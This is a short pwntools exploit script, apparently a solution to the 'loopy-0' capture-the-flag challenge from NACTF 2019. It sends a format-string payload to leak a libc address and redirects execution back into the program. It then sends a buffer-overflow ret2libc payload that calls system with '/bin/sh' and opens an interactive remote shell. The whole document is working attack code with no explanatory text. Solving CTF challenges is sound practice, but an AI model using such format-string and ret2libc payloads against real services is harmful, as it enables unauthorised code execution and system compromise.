from pwn import *

ip = "shell.2019.nactf.com"
port = 31283
r = remote(ip,port)

elf = 'loopy-0' 
#r = process("./"+elf)

context.arch = 'i386'

offset = 4
exploit1 = "%27$p".ljust( 76 , 'a' )+ p32(0x08049192)

raw_input("aa")
r.sendlineafter('Type something>' , exploit1)
r.recvuntil('You typed: ')
setvbuf = r.recvuntil('aaaaa')

base_offset =  241 + 0x0001aa50
base =  int(setvbuf[0:10] , 16) - base_offset
system = base +  0x0003ec00
sh = base + 0x017eaaa

exploit2 =  'a' * 76  + p32(system) + 'aaaa' + p32(sh)
r.sendlineafter('Type something>' , exploit2)
r.interactive()
